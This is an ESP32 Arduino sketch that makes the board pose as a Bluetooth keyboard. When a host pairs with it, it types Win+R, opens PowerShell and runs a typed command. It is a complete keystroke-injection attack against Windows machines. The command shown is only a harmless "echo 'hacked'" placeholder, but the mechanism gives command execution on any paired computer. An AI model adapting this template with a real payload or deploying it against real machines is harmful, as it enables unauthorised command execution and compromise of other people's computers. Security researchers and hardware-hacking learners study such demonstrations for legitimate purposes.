#include <BleKeyboard.h>

BleKeyboard bleKeyboard("ESP32 KB", "manufacturer", 100);

void setup() {
  Serial.begin(115200);
  bleKeyboard.begin();
}

void loop() {
  if (bleKeyboard.isConnected()) {
    delay(1000);

    bleKeyboard.press(KEY_LEFT_GUI);
    bleKeyboard.print("r");
    bleKeyboard.releaseAll();
    delay(800);

    bleKeyboard.print("powershell");
    delay(200);
    bleKeyboard.write(KEY_RETURN);
    delay(1500);

    bleKeyboard.print("echo 'hacked'");
    delay(200);
    bleKeyboard.write(KEY_RETURN);

    while (true) delay(1000);
  }
  delay(500);
}